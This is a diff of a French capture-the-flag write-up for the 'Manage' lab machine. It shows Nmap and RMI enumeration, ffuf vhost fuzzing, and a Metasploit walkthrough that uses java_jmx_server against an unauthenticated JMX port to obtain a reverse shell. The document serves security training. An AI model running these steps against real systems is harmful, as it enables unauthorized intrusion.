@@ -69,31 +69,209 @@ Au départ, mes scans Nmap classiques ne donnent rien d’exploitable : juste un
 
 ## Énumération
 
+Pour démarrer, je lance mon script d'énumération Nmap “tout-en-un” :
+
+```bash
+mon-nouveau-nmap manage.htb
+
+# Résultats dans le répertoire mes_scans/
+#  - mes_scans/full_tcp_scan.txt
+#  - mes_scans/aggressive_vuln_scan.txt
+#  - mes_scans/cms_vuln_scan.txt
+#  - mes_scans/udp_vuln_scan.txt
+```
+
 ### Scan initial
 
-- Commandes (nmap, rustscan, ton `mon_scan`), options, sortie synthétique.
-- Exemple :
-  ```bash
-  nmap -sCV -p- -T4 -oN scans/nmap_full.txt <IP_CIBLE>
-  ```
+Le scan initial TCP complet (`mes_scans/full_tcp_scan.txt`) révèle les ports ouverts suivants :
+
+```bash
+# Nmap 7.95 scan initiated Mon Nov 17 16:58:19 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 --max-retries 3 -oN mes_scans/full_tcp_scan.txt manage.htb
+Nmap scan report for manage.htb (10.129.234.57)
+Host is up (0.0083s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+2222/tcp  open  EtherNetIP-1
+8080/tcp  open  http-proxy
+35627/tcp open  unknown
+42277/tcp open  unknown
+
+# Nmap done at Mon Nov 17 16:58:27 2025 -- 1 IP address (1 host up) scanned in 7.43 seconds
+
+```
+
+
 
 ### Scan agressif
 
-- Fuzzing (ffuf/gobuster), CMS/version, endpoints/API, users potentiels.
-- Commentaires HTML, fichiers oubliés, dev notes, etc.
+Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités :
 
-### Scan réperoires
+```bash
+[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour manage.htb
+[+] Commande utilisée :
+    nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "manage.htb"
+
+# Nmap 7.95 scan initiated Mon Nov 17 16:58:27 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,35627,42277 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN mes_scans/aggressive_vuln_scan_raw.txt manage.htb
+Nmap scan report for manage.htb (10.129.234.57)
+Host is up (0.0077s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+2222/tcp  open  java-rmi   Java RMI
+8080/tcp  open  http       Apache Tomcat 10.1.19
+35627/tcp open  tcpwrapped
+42277/tcp open  java-rmi   Java RMI
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT     ADDRESS
+1   7.57 ms 10.10.14.1
+2   8.06 ms manage.htb (10.129.234.57)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Nov 17 16:58:41 2025 -- 1 IP address (1 host up) scanned in 13.92 seconds
+
+```
+
+
+
+Ce scan confirme :
+
+- **Tomcat 10.1.19** sur le port **8080/tcp**
+- Deux services **Java RMI** sur **2222/tcp** et **45931/tcp** 
+- Aucun script Nmap “http-vuln-*” ne remonte de vulnérabilité web évidente sur Tomcat
+
+Un scan complémentaire NMAP NSE orienté **rmi** va nous donner plus d'infos
+
+```bash
+nmap -sV --script rmi* -p 2222 -oN mes_scans/rmi_scan.txt manage.htb
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 11:03 CET
+Nmap scan report for manage.htb (10.129.234.57)
+Host is up (0.0079s latency).
+
+PORT     STATE SERVICE  VERSION
+2222/tcp open  java-rmi Java RMI
+| rmi-dumpregistry: 
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.1.1:42277
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
+
+```
+
+**Le script NSE arrive à interroger le registre RMI**
+ → S’il répond, c’est qu’il n’exige **ni authentification**, ni **politique de sécurité**, ni **filtrage IP**.
+
+Dès que **jmxrmi apparaît**, tu sais que :
+
+- il existe une interface **JMX Remote**,
+- elle n’est pas protégée,
+- elle est probablement exploitable via `java_jmx_server` (Metasploit) ou `JMXInvokerServlet` selon la version.
+
+### Scan ciblé CMS
+
+Le scan ciblé CMS (`mes_scans/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
+
+### Scan UDP rapide
+
+Le scan UDP rapide (`mes_scans/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
+
+### Scan répertoires
+
+Pour la partie découverte de chemins web, j’utilise mon script dédié **mon-recoweb** sur le service Tomcat :
+
+```bash
+mon-recoweb manage.htb:8080
+```
+
+Les résultats principaux :
+
+- `http://manage.htb:8080/` : page d'accueil Tomcat par défaut
+- Redirections **302** vers quelques applications internes Tomcat :
+  - `/docs`
+  - `/examples`
+  - `/manager`
+  - `/host-manager`
+
+En approfondissant sur `/docs` et `/examples` (nouveaux `mon-recoweb` ciblés), aucun répertoire ou fichier applicatif intéressant n'est découvert : uniquement la documentation Tomcat standard et les exemples, sans appli custom de type “manage” ou panneau d’admin dédié.
 
 ### Scan vhosts
+
+Enfin, je teste rapidement la présence de vhosts cachés avec ffuf en bruteforçant l’en-tête `Host` :
+
+```bash
+ffuf -c \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  -u http://manage.htb \
+  -H "Host: FUZZ.manage.htb" \
+  -mc 200,302,401,403
+```
+
+
+
+Le fuzzing des vhosts ne retourne **aucun sous-domaine exploitable** : pas de réponse différente ou intéressante selon la valeur du `Host`.
+ Je considère donc qu’il n’y a **pas de vhost applicatif caché évident**, et je recentre l’analyse sur :
+
+- **Tomcat /manager** (403 mais important conceptuellement)
+- et surtout la **présence des deux services Java RMI**, qui serviront de point d’entrée pour l’exploitation ultérieure.
 
 
 ---
 
 ## Exploitation – Prise de pied (Foothold)
 
-- Vecteur d’entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d’accès (`id`, `whoami`, `hostname`).
+Pour confirmer la piste JMX, j’ai lancé un scan Nmap ciblé sur le port RMI détecté au scan agressif. Le script NSE `rmi*` permet d’interroger un registre RMI et révèle souvent la présence d’une interface JMX exposée. Sur cette machine, le script a clairement montré que le serveur RMI acceptait les connexions distantes sans authentification, ce qui n’est normalement pas autorisé. L’entrée `jmxrmi` était accessible, signe d’une configuration Tomcat vulnérable. Une interface JMX ouverte ainsi vers l’extérieur équivaut à une exécution de code à distance. 
+
+Une recherche Web sur "Metasploit modules Java RMI JMX" va livrer:
+
+- **Java JMX Server Insecure Configuration Java Code Execution**
+  - Module : `exploit/multi/misc/java_jmx_server`
+  - Description : Ce module tire parti d'une configuration non sécurisée de l'interface JMX, permettant de charger des classes depuis une URL HTTP distante. Il est efficace contre les interfaces JMX sans authentification ou avec une configuration faible (par exemple, si `com.sun.management.jmxremote.authenticate=false`).
+
+Cette confirmation va me permettre de tester le module Metasploit `java_jmx_server` qui devrait me fournir un shell `tomcat`. 
+
+
+
+```bash
+# Step 1: Start Metasploit
+msfconsole
+
+# Step 2: Search for the exploit
+search java_jmx_server
+
+# Step 3: Use the JMX RMI exploit
+use exploit/multi/misc/java_jmx_server
+
+# Step 4: Set the target host
+set RHOST <machine IP>
+
+# Step 5: Set the RMI port
+set RPORT 2222
+
+# Step 6: Set your local IP (replace with your actual tun0 IP)
+set LHOST <your_tun0 IP>
+
+# Step 7: Set the local port to receive the shell
+set LPORT 1337
+
+# Step 8: Launch the exploit
+exploit
+```
+
+
 
 ---
 
